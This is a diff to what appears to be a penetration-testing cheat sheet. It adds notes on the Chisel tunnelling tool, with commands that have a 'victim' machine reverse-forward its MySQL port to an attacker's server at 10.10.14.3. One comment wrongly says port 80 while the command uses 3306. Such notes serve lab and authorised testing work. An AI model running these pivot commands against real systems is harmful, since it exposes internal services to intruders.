@@ -178,3 +178,19 @@
         [_https://github.com/lukebaggett/dnscat2-powershell/_](http://web.archive.org/web/20171113221652/https://github.com/lukebaggett/dnscat2-powershell/)
 
         `dnscat --host <dnscat server ip>`
+*   Chisel
+
+    * Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. What that means is that I can run a server on my attacking machine, and then connect to it from target boxes or vice versa. On making that connection, I can define different kinds of tunnels I want to set up.
+    * Typical use. Example assumes attacking machine (server) is 10.10.14.3, victim machine (client) is running from 10.10.10.10.
+
+      Start server listening on 9002:
+
+      `./chisel server --reverse --port 9002`
+
+      From victim:
+
+      Listen on victim 80, forward to localhost port 80 on client:
+
+      `./chisel client 10.10.14.3:9002 R:3306:127.0.0.1:3306`
+
+      We can now access MySQL (3306) from our attacking machine.
